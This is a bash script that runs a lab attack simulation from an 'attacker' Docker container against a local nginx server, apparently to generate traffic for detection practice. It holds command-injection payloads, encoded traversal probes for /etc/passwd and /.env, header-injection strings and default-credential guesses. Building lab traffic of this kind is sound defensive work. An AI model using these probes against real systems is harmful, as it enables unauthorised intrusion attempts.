#!/bin/bash

set -e

echo "Starting additional lab attack simulations..."

docker exec -i attacker bash <<'ATTACKER_SCRIPT'
set -e

NGINX_URL="http://web-server"

command -v curl >/dev/null 2>&1 || {
  apt-get update -qq
  apt-get install -y -qq curl >/dev/null 2>&1
}

echo "[1/7] Suspicious user agents"
for agent in "Mozilla/5.0 sqlmap" "Nikto" "masscan" "zgrab/0.x" "curl/7.1"; do
  curl -sS -A "$agent" "$NGINX_URL/" >/dev/null || true
done

echo "[2/7] Encoded traversal probes"
for path in \
  "/%2e%2e/%2e%2e/etc/passwd" \
  "/%2e%2e%2f%2e%2e%2fetc/passwd" \
  "/..%2f..%2fetc/passwd" \
  "/%252e%252e/%252e%252e/etc/passwd"; do
  curl -sS "$NGINX_URL$path" >/dev/null || true
done

echo "[3/7] Command-injection probes in query parameters"
for payload in \
  '127.0.0.1;id' \
  '127.0.0.1|whoami' \
  '$(uname -a)' \
  '`cat /etc/passwd`'; do
  curl -sS --get "$NGINX_URL/diagnostic" \
    --data-urlencode "host=$payload" >/dev/null || true
done

echo "[4/7] Header-injection probes"
curl -sS -H $'X-Forwarded-For: 127.0.0.1\r\nX-Lab-Test: header-probe' \
  "$NGINX_URL/" >/dev/null || true
curl -sS -H "X-Original-URL: /admin" "$NGINX_URL/" >/dev/null || true
curl -sS -H "X-Rewrite-URL: /private" "$NGINX_URL/" >/dev/null || true

echo "[5/7] HTTP method and endpoint probes"
for method in OPTIONS PUT DELETE PATCH TRACE CONNECT; do
  curl -sS -X "$method" "$NGINX_URL/admin" >/dev/null || true
done
for endpoint in /admin /login /wp-admin /server-status /.env /actuator/health; do
  curl -sS "$NGINX_URL$endpoint" >/dev/null || true
done

echo "[6/7] Authentication anomalies"
for credentials in admin:wrong admin:password root:toor test:test guest:guest; do
  curl -sS -u "$credentials" "$NGINX_URL/" >/dev/null || true
done

echo "[7/7] Large and unusual request metadata"
curl -sS -H "Referer: http://malicious.example/phishing" \
  -H "Cookie: session=invalid-lab-session" "$NGINX_URL/" >/dev/null || true
curl -sS -H "Range: bytes=0-999999999" "$NGINX_URL/" >/dev/null || true
curl -sS --max-time 5 -d "$(printf 'A%.0s' {1..10000})" \
  "$NGINX_URL/upload" >/dev/null || true

ATTACKER_SCRIPT

echo "Additional attack simulation complete."